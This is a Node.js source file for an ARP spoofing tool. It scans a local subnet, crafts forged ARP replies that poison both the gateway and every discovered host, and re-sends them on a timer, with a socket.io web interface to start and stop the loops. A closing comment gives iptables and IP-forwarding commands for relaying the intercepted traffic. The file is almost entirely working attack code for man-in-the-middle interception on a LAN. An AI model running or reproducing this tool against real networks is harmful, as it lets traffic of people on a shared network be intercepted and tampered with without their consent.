// arp spoofing and network scan engine
// 
// localhost:8082
//
// TODO:
// * respond to ARP requests. Currently just spaming with arp poison packets

/* 
 *
 * SETTINGS
 * 
 */

/*  END  */


/*
 * 
 * GLOBAL VARIABLES
 * 
 */
const isWin       = (process.platform === 'win32')
const isLinux     = (process.platform === 'linux')
const isOSX       = (process.platform === 'darwin')
const spoofinterval = 4000; // send arp spoof ever N ms
const scaninterval = 20000; // check for new hosts every N

/*  END  */

/*
 * 
 * COMMAND LINE PARAMETERS
 * 
 */
// if (process.getuid() != 0) {
//     console.error('PCAP probably needs root');
//     console.error('Will setuid/gid to owner of .js after pcap session initialized.');
// }
if (process.argv.length < 4) {
    console.error('Example use: ');
    console.error('  sudo node aprspoof.js',
                  '--eth <eth>',
                  '--gateway <ip>',
                  '[--ip-range-start <ip>',
                   '--ip-range-end <ip>',
                   '--our-ip <ip>] [--webui only]\n');
    console.error('Required:');
    console.error('  <eth>             interface to use.');
    console.error('  <gateway>         gateway to spoof from/to');
    console.error('Optional:');
    console.error('  <our_ip>          determined from ip of eth if not defined');
    console.error('  <our_macaddr>     determined from ip of eth if not defined');
    console.error('  <ip_range_start>  determined from our_ip if not defined');
    console.error('  <ip_range_end>    determined from our_ip if not defined');
    console.error('  --start no        init pcap but wait for webui to start');
    process.exit(1);
}
// convert args to dictionary (if '-' in names then access with ['name'] rather than .name)
let args={}
for (let i=2;i<process.argv.length;) args[process.argv[i++].slice(2)]=process.argv[i++]
// with bool option:
// const boolparams = ['--boolthis','--orthat']
// for (let i=2;i<process.argv.length;) { 
//     v=process.argv[i++]
//     if (boolparams.includes(v)) args[v.slice(2)]=true
//     else args[v.slice(2)]=process.argv[i++] }

/*
 * 
 * LIBRARY DEPENDENCIES
 * 
 * loaded now rather than earlier to prevent unescisary execution of lib code as root
 * 
 */
// Standard libs:
// Our own libs (that do not include 3rd parties):
// 3rd party (or our libs that include 3rd party)
const nettools = require('./nettools.js');  // win/lnx/osx uses exec `ping` and `arp`.
/*  END  */


const requestednetinterface = args['eth'] || null;
const gatewayip             = args['gateway'] || null; // TODO: could replace this with the npm default-route
let   netinterface;
let   ip_range_start        = args['ip-range-start'] || null;
let   ip_range_end          = args['ip-range-end'] || null;
let   myip                  = args['our-ip'] || null;
let   start_now             = args['start'] && args['start'] === 'no' ? false : true;

console.log('\nNetwork interfaces:');
// linux:   {'wlan0': [{address:...},{}], {'eth0'...}}
// osx:     {'en1':   [{address:...},{}], {'en0'...}}
// windows: {'WLAN':  [{address:...},{}], {'Ethernet Interface 1'...}}
Object.entries(require('os').networkInterfaces()).forEach(entry => {
    let devicename = entry[0]
    if (requestednetinterface === devicename) {
        console.log(`${devicename} <--- chosen`);
        netinterface = requestednetinterface;
    }
    else
        console.log(`${devicename}`);
    if (entry[1].length > 0) {
        if (!myip && netinterface === devicename) {// assume first addr is ours
            myip = entry[1][0].address;
            mymac = entry[1][0].mac;
        }
        entry[1].forEach(address => {
            console.log(` ${address.address} / ${address.netmask}`) 
        });
    }
    else
        console.log(' no address\n');
});

if (netinterface && ! ip_range_start) {
    ip_range_start = myip.split('.').slice(0,-1).join('.')+'.1', 
    ip_range_end   = myip.split('.').slice(0,-1).join('.')+'.254'
}


console.log('\nSettings');
if (netinterface) {
    console.log(` interface : '${netinterface}'`);
    console.log(`  ip range : '${ip_range_start}' to '${ip_range_end}'`);
    console.log(`     my ip : '${myip}'`);
    console.log(`    my mac : '${mymac}'`);
    console.log(`gateway ip : '${gatewayip}'`);
    console.log(` start now : '${start_now}'`);
}
else {
    console.error(`! Couldn't not find requested interface ${requestednetinterface}`)
    console.error('! Will wait for usre to define in webui')
}


// Do the following as root and then downgrade, if we are root
if (isLinux || isOSX) {
    const pcap = require("pcap");
    try {
        pcap_session = pcap.createSession(netinterface, "arp");
    } catch (e) {
        console.error('\nError: pcap could not createSession (permissions?)\n\n',e)
        process.exit(1)
    }
    // dowgrade permissions:
    if (process.getuid() == 0) {
        require('fs').stat(__filename, function(err,s) {
            console.log(`Downgrade permissions: change process uid/gid found on file\n\"${__filename}\"\nowner/group: ${s.uid}/${s.gid}`);
            process.setgid(s.gid);
            process.setuid(s.uid);
        });
    }
}


/*
 * 
 * PROCESS CONTROL (stop, stdin control)
 * 
 */                    
//                          ip we tell and convince -------.
//                          ip we want to control --v      v
// poison_packet('11:11:11:11:11:11','1.1.1.1','2.2.2.2','3.3.3.3')
// typically we would tell the gateway we are the victim's ip 
//  and tell the victim we are the gateway
function poison_packet(ourmac, ourip, victimip, tellip) {
    // based on https://github.com/skepticfx/arpjs/blob/master/lib/packet.js#L53 (MIT)
    // but here so can make windows compatible and reduce dependencies
    // turn '00:00:00:..' into ['0x00','0x00'] which new Buffer is fine with converting
    if (typeof ourmac    === 'string')    ourmac = ourmac.split(':').map(x=>'0x'+x)
    if (typeof ourip     === 'string')     ourip = ourip.split('.')
    if (typeof tellip    === 'string')    tellip = tellip.split('.')
    if (typeof victimip  === 'string')  victimip = victimip.split('.')
    return new Buffer.from([
        // ETHERNET
        // 0    = Destination MAC
        //  pkt.dst = macToArr(pktObj.dst_mac) // tell: 'ff:ff:ff:ff:ff:ff'
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,    //  broadcast
        // 6    = Source MAC
        // pkt.src = macToArr(macAddr)        // this machines mac 
        ourmac[0], ourmac[1], ourmac[2], 
        ourmac[3], ourmac[4], ourmac[5],       
        0x08, 0x06,   // 12   = EtherType = ARP
        // ARP
        0x00, 0x01,   // 14/0   = Hardware Type = Ethernet (or wifi)
        0x08, 0x00,   // 16/2   = Protocol type = ipv4 (request ipv4 route info)
        0x06, 0x04,   // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
        0x00, 0x02,   // 20/6   = Operation (ARP, who-has) 01=request,02=reply
        // 22/8   = Sender Hardware Addr (MAC)
        // pkt.src_mac = macToArr(macAddr)        // this machines mac
        ourmac[0], ourmac[1], ourmac[2], 
        ourmac[3], ourmac[4], ourmac[5],        
        // 28/14  = Sender Protocol address (ipv4)
        // pkt.src_ip = ipToArr(pktObj.src_ip)    // victum: e.g. gw
        victimip[0], victimip[1], victimip[2], victimip[3], 
        // 32/18  = Target Hardware Address (Blank/nulls for who-has)
        // pkt.src_ip = ipToArr(pktObj.src_ip)    // victum: e.g. gw
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
        // 38/24  = Target Protocol address (ipv4)
        // pkt.dst_ip = ipToArr(pktObj.dst_ip)    // tell: e.g. host
        tellip[0], tellip[1], tellip[2], tellip[3] 
        ]);
}














// code currently appends to found_hosts so if target (e.g.phone) comes out 
// of sleep it does not need to be re-discovered
let found_hosts = {}; // {mac1:ip,mac2:ip}
let recent_hosts = {}; // {mac1:ip,mac2:ip} but only last scan found
let filter_ips = myip ? [myip] : [] // ip's to filter from webui
let scantimer;
let spooftimer;
let spoofpause = false; // scanner sets this to be sure we dont respond to our own ping requests

function scan1(ip_range_start, ip_range_end, filter_ips, callback) {
    spoofpause = true; // stop spoofer so it doesnt confuse our scan
    nettools.scan(ip_range_start,ip_range_end, filter_ips, ret => {
        spoofpause = false;
        if (ret) {
            found_hosts = Object.assign({}, found_hosts, ret); // add found hosts
            recent_hosts = ret;
        }
        if (typeof callback === 'function')
            callback(ret)
    })
}
function scanloop(ip_range_start, ip_range_end, filter_ips, interval, callback) {
    if (!scantimer)
        scantimer = setInterval(() => {
            scan1(ip_range_start, ip_range_end, filter_ips, callback)
        }, interval);
}
function scanstop() { 
    if (scantimer) {
        clearInterval(scantimer)
        scantimer = null
    }
}

function spoof1(ourmac, ourip, gatewayip, targetip) {
    send(poison_packet(ourmac, ourip, targetip, gatewayip))
    if (gatewayip !== targetip)
        send(poison_packet(ourmac, ourip, gatewayip, targetip))
}
// reads global found_hosts and spoofs each every N ms
function spoofloop(ourmac, ourip, gatewayip, interval, callback) {
    spoofpause = false
    if (!spooftimer)
        spooftimer = setInterval(() => {
            if (!spoofpause) 
                Object.values(found_hosts).forEach(targetip => {
                    spoof1(ourmac,ourip,gatewayip,targetip, callback)
                });
        }, interval);
}
function spoofstop() { 
    if (spooftimer) {
        clearInterval(spooftimer)
        spooftimer = null
    }
}



let cap_session;

if (isWin) {
    const cap = require('cap');
    cap_session = new cap.Cap();
    var buffer = Buffer.alloc(65535);
    var cap_linktype = cap_session.open(netinterface, "arp", 10 * 1024 * 1024, buffer);
}
// Linux/OSX: pcap_session was setup earlier in scrip while we still had root permissions
// fyi cap/windows does not need root perms

function send(packet) {
    //console.log('cap send')
    try {
        if (isWin)
            cap_session.send(packet, packet.length);
        else 
            pcap_session.inject(packet);
    } catch (e) {
        console.error("Error sending packet:", e);
    }
}





if (start_now  && gatewayip && ip_range_start && ip_range_end && filter_ips && mymac && myip && gatewayip) {
    console.log('## Starting arp spoof from shell')
    const async = require('async');
    async.waterfall([
        function (callback) {
            // run scan once, then start scanner
            // pass through call back so we continue to next after
            scan1(ip_range_start, ip_range_end, filter_ips, ret => {callback(null)})
            scanloop(ip_range_start, ip_range_end, filter_ips, scaninterval)
        },
        function (callback) {
            spoofloop(mymac,myip,gatewayip,spoofinterval)
        },
        // OLDER SIMPLER TEST ROUTINES:
        // function (callback) {
        //     scan1(ip_range_start,ip_range_end, myip, ret => callback('found_hosts',ret))
        //     // OR:
        //     // let filter_ips = [myip]
        //     // nettools.scan(ip_range_start,ip_range_end, filter_ips, ret => {
        //     //     callback('found_hosts',ret)
        //     // })
        // },
        // function (callback) {
        //     console.log('test one host (my phone) ')
        //     let ourip    = myip || '192.168.178.26'
        //     let ourmac   = '3c:a9:f4:21:00:7c'
        //     let phoneip  = '192.168.178.23'
        //     let phonemac = 'a4:4b:d5:a6:c1:0b'
        //     let gwip     = '192.168.178.1'
        //     let gwmac    = '08:96:d7:96:98:99'
    
        //     setInterval(() => {
        //         process.stdout.write('.');
        //         send(poison_packet(ourmac,ourip,phoneip,gwip))
        //         send(poison_packet(ourmac,ourip,gwip,phoneip))    
        //     }, arpinterval);
        //     // callback(null)
        // }
    ],console.log)
}


console.log('## starting webui on http://localhost:8083')
const express  = require('express')
const app      = express();
const server   = require('http').createServer(app);
server.listen(8083);
const io       = require('socket.io').listen(server);
app.get('/', function (req, res) {
    res.sendfile(__dirname + '/ui/arpspoof.html');
});
console.log('serving '+__dirname + '/ui/arpspoof.html');
app.use('/ui', express.static(__dirname + '/ui'));

io.sockets.on('connect', socket => {
    console.log('client connected');

    // this channel is whence server/admin sends commands to client (avoiding interacting with UI)
    socket.join('arpspoof');


    // give client all information
    if (!Object.keys(found_hosts).length > 0)
        socket.emit('found_hosts', found_hosts);
    if (!Object.keys(recent_hosts).length > 0)
        socket.emit('recent_hosts', recent_hosts);
    if (!Object.keys(filter_ips).length > 0)
        socket.emit('filter_ips', filter_ips);            

    if (gatewayip && ip_range_start && ip_range_start && myip)
        socket.emit('network_settings', {
            gatewayip     : gatewayip,
            ip_range_start: ip_range_start,
            ip_range_end  : ip_range_end,
            myip          : myip
        })
        
    socket.on('get_found_hosts', () => {
        console.log('get_found_hosts');
        socket.emit('found_hosts', found_hosts);
    })
    socket.on('get_recent_hosts', () => {
        console.log('get_recent_hosts');
        socket.emit('recent_hosts', recent_hosts);
    })
    socket.on('get_filter_ips', () => {
        console.log('get_filter_ips');
        socket.emit('filter_ips', filter_ips);
    })

    socket.on('do_scan1', params => {
        console.log('do_scan1', params);
        scan1(params.ip_range_start, 
                params.ip_range_end, 
                params.filter_ips, 
                ret => { socket.emit('recent_hosts',ret);
        }) 
    });
    socket.on('start_scanloop', params => {
        console.log('start_scanloop', params);
        scanloop(params.ip_range_start, 
                    params.ip_range_end, 
                    params.filter_ips, 
                    params.interval,
                    ret => {
                    io.to('arpspoof').emit('recent_hosts', ret);
                    io.to('arpspoof').emit('found_hosts', found_hosts);
                });
    });
    socket.on('stop_scanloop', scanstop);

    socket.on('start_spoofloop', params => {
        console.log('start_spoofloop', params);
        spoofloop(params.ourmac, 
                    params.ourip, 
                    params.gatewayip, 
                    params.interval)
    });
    socket.on('stop_spoofloop', spoofstop);

    socket.on('get_spoofloop_status', ()=>{
        var statush = spooftimer ? true : false;
        console.log('get_spoofloop_status', status);
        socket.emit('spoofloop_status', {
            running: status
        })
    });

    socket.on('set_spoof_hosts', params => {
        console.log('set_spoof_hosts',params);
        found_hosts = params
    });
});






/*
SHOULD BE ENOUGH ?:
sudo sysctl -w net.ipv4.ip_forward=1
+ sudo iptables -t nat -F


// TRROUBLESHOOTING
+ sudo iptables -A FORWARD -i wlan0 -s 192.168.178.0/24 -m conntrack --ctstate NEW -j ACCEPT
+ sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+ sudo iptables -t nat -A POSTROUTING -j MASQUERADE

+ sudo sysctl -w net.ipv4.ip_forward=0
net.ipv4.ip_forward = 0
+ sudo iptables -D FORWARD -i wlan0 -s 192.168.178.0/24 -m conntrack --ctstate NEW -j ACCEPT
+ sudo iptables -D FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

*/